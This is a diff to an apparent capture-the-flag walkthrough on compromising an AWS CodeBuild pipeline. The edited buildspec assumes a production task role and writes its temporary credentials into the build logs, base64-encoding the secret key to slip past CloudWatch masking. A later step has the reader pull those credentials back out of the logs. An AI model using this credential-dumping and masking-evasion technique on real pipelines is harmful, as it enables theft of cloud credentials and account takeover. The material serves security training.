@@ -110,10 +110,18 @@ phases:
         TEMP_CREDS=$(aws sts assume-role \
           --role-arn "arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/h7tex-prod-task-role" \
           --role-session-name "PwnedByBuild" \
-          --tags Key=Project,Value=WebAppProd) # Aha! Using the clue!
-      # We need those creds. Easiest way is just printing to the logs!
-      - echo "---BEGIN_CREDS---" #
-      - echo $TEMP_CREDS | base64 # Got to use base64 as cloudwatch security mechnanism doesn't allow secret key to be shown 
+          --tags Key=Project,Value=WebAppProd)
+      # Extract and Base64-encode ONLY the SecretAccessKey
+      #  Why? Because of cloudwatch security mechanism, Got to use base64 as cloudwatch security mechnanism doesn't allow secret key to be shown
+      - SECRET_KEY=$(echo "$TEMP_CREDS" | jq -r '.Credentials.SecretAccessKey')
+      - ENCODED_SECRET=$(echo -n "$SECRET_KEY" | base64)
+      # Print credentials with only the secret key encoded
+      - echo "---BEGIN_ACCESS_KEY---"
+      - echo $(echo "$TEMP_CREDS" | jq -r '.Credentials.AccessKeyId')
+      - echo "---BEGIN_ENCODED_SECRET_KEY---"
+      - echo "$ENCODED_SECRET"
+      - echo "---BEGIN_SESSION_TOKEN---"
+      - echo $(echo "$TEMP_CREDS" | jq -r '.Credentials.SessionToken')
       - echo "---END_CREDS---"
 ```
 
@@ -157,6 +165,8 @@ aws logs get-log-events \
 
 Scroll through that log output, find your `---BEGIN_CREDS---` markers, and copy the JSON blob with the final set of keys (AccessKeyId, SecretAccessKey, SessionToken).
 
+
+![image](./images/secret.png)
 -----
 
 ### **8.Getting the Flag** 
